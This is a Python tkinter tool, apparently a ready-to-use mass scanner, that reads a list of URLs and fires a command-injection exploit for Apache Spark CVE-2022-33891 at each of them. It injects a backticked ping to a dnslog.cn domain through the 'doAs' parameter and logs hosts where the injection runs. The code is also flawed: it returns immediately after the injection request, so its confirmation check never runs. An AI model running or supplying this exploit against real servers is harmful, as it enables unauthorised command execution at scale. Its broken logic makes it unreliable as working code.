import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def apache_spark_cve_2022_33891_exp(target_url):
    session = requests.session()
    count = 0
    dnslog_getdomain_url = 'http://www.dnslog.cn/getdomain.php?t=0'
    try:
        dnslog_getdomain_res = session.get(dnslog_getdomain_url, verify=False, timeout=20)
        domain = dnslog_getdomain_res.text
    except Exception as err:
        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        apache_spark_cve_2022_33891_text.see(END)
    targeturl = f'{target_url}/?doAs=`ping {domain}`'
    try:
        res = session.get(url=targeturl, verify=False, timeout=20)
        return res.status_code
    except Exception as e:
        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(e) + "\n")
        apache_spark_cve_2022_33891_text.see(END)
    dnslog_getrecords_url = 'http://www.dnslog.cn/getrecords.php?t=0'
    try:
        dnslog_getrecords_res = session.get(dnslog_getrecords_url, verify=False, timeout=20)
    except Exception as error:
        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(error) + "\n")
        apache_spark_cve_2022_33891_text.see(END)
    if domain in dnslog_getrecords_res.text:
        if count == 0:
            apache_spark_cve_2022_33891_text.insert(END, "【！！！！！！】存在漏洞的url：" + targeturl + "\n")
            apache_spark_cve_2022_33891_text.see(END)
            with open("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)的url.txt", 'a') as f:
                f.write(targeturl + "\n")
        else:
            apache_spark_cve_2022_33891_text.insert(END, "【！！！！！！】存在漏洞的url：" + targeturl + "\n")
            apache_spark_cve_2022_33891_text.see(END)
            with open("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)的url.txt", 'a') as f:
                f.write(targeturl + "\n")
    else:
        apache_spark_cve_2022_33891_text.insert(END, "【×】不存在漏洞的url：" + targeturl + "\n")
        apache_spark_cve_2022_33891_text.see(END)
def get_apache_spark_cve_2022_33891_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def apache_spark_cve_2022_33891_gui():
    apache_spark_cve_2022_33891 = tk.Tk()
    apache_spark_cve_2022_33891.geometry("910x450")
    apache_spark_cve_2022_33891.title("Apache Spark 远程命令执行漏洞(CVE-2022-33891)一把梭")
    apache_spark_cve_2022_33891.resizable(0, 0)
    apache_spark_cve_2022_33891.iconbitmap('logo.ico')
    global apache_spark_cve_2022_33891_text
    apache_spark_cve_2022_33891_text = scrolledtext.ScrolledText(apache_spark_cve_2022_33891,width=123, height=25)
    apache_spark_cve_2022_33891_text.grid(row=0, column=0, padx=10, pady=10)
    apache_spark_cve_2022_33891_text.see(END)
    addrs = get_apache_spark_cve_2022_33891_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(apache_spark_cve_2022_33891_exp, addr)
    apache_spark_cve_2022_33891.mainloop()
